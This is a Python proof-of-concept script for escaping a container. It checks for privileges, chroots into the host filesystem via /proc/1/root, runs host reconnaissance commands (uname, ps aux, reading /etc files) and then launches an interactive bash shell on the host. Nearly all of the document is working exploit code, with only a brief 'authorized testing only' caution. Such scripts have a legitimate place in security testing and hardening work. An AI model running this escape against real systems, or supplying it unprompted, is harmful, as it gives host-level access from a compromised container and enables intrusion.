#!/usr/bin/env python3
"""
Container Escape and Host Reconnaissance Proof-of-Concept
---------------------------------------------------------
This script attempts to escape a container by chrooting into the host's 
filesystem via /proc/1/root and then performing basic host reconnaissance.
It requires that the container has:
  - /proc/1/root accessible (typically via host PID namespace)
  - CAP_SYS_ADMIN (or equivalent privileges) to perform chroot
  - Running as root inside the container

CAUTION: Use only in authorized security testing environments.
"""

import os
import subprocess
import sys

def run_command(command, timeout=10):
    """Run a shell command and return its output."""
    try:
        result = subprocess.run(
            command, shell=True, check=False,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, timeout=timeout
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {str(e)}"

def check_escape_capabilities():
    """Check for required capabilities to perform a container escape."""
    capabilities = {}
    capabilities["proc_1_root_access"] = os.access("/proc/1/root", os.R_OK)
    cap_info = run_command("capsh --print")
    capabilities["cap_sys_admin"] = "cap_sys_admin" in cap_info.lower()
    # chroot() requires root privileges
    capabilities["is_root"] = (os.geteuid() == 0)
    print("[*] Escape Capability Check:")
    for k, v in capabilities.items():
        print(f"    {k}: {v}")
    return capabilities

def escape_to_host():
    """
    Attempt to escape the container by chrooting into /proc/1/root.
    If successful, the process's view of '/' is now the host's filesystem.
    """
    caps = check_escape_capabilities()
    if not (caps["proc_1_root_access"] and caps["cap_sys_admin"] and caps["is_root"]):
        print("[-] Required privileges or access to /proc/1/root not available.")
        return False

    host_path = "/proc/1/root"
    # Validate access by checking for a known host file
    test_file = os.path.join(host_path, "etc", "os-release")
    if not (os.path.exists(test_file) and os.access(test_file, os.R_OK)):
        print("[-] Validation failed: Cannot read key host file (etc/os-release) via /proc/1/root")
        return False

    try:
        print("[*] Attempting chroot escape using /proc/1/root...")
        # chroot into the host filesystem
        os.chroot(host_path)
        os.chdir("/")  # change directory to new root
        print("[+] chroot successful! You are now operating in the host filesystem context.")
        return True
    except Exception as e:
        print(f"[-] chroot escape failed: {e}")
        return False

def recon_host():
    """
    Perform basic host reconnaissance by executing key commands.
    This runs after a successful escape (chroot) so that the commands are
    executed against the host's filesystem.
    """
    print("\n=== Host Reconnaissance ===")
    commands = {
        "Kernel & OS Info": "uname -a",
        "OS Release": "cat /etc/os-release",
        "Hostname": "cat /etc/hostname",
        "System Uptime": "cat /proc/uptime",
        "Process Listing": "ps aux"
    }
    for label, cmd in commands.items():
        print(f"\n--- {label} ---")
        output = run_command(cmd)
        print(output)

def main():
    print("==== Container Escape and Host Recon PoC ====")
    print("CAUTION: This script is for authorized security testing only.\n")
    
    if escape_to_host():
        # Once escaped, perform host reconnaissance.
        recon_host()
        # Optionally, spawn an interactive shell:
        try:
            print("\n[+] Launching interactive shell on the host (exit to quit)...")
            os.execvp("/bin/bash", ["/bin/bash"])
        except Exception as e:
            print(f"[-] Failed to spawn interactive shell: {e}")
    else:
        print("[-] Container escape failed. Cannot recon host.")

if __name__ == "__main__":
    main()
